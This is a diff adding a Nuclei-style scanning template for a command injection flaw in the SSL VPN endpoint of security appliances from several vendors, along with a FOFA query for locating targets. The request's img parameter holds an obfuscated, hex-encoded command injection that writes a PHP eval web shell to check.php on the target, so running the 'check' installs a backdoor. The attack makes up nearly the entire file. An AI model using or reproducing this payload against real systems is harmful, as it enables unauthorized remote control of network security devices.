@@ -1,0 +1,32 @@
+id: security_products_rce
+info:
+  name: 多厂商安全设备远程命令执行漏洞
+  author: rain
+  severity: high
+  description: 多厂商安全设备远程命令执行漏洞
+  tags:
+    - rce
+  metadata:
+    fofa-query: body="/webui/images/default/default/alert_close.jpg"
+http:
+  - raw:
+      - |
+        GET /sslvpn/sslvpn_client.php?client=logoImg&img=%78%25%32%30%2f%74%6d%70%7c%65%63%68%6f%25%32%30%25%36%30%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%68%61%63%6b%65%72%27%5d%29%3b%20%3f%3e%25%36%30%25%32%30%7c%74%65%65%25%32%30%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%73%73%6c%76%70%6e%2f%63%68%65%63%6b%2e%70%68%70%7c%6c%73 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        DNT: 1
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - "tmp"
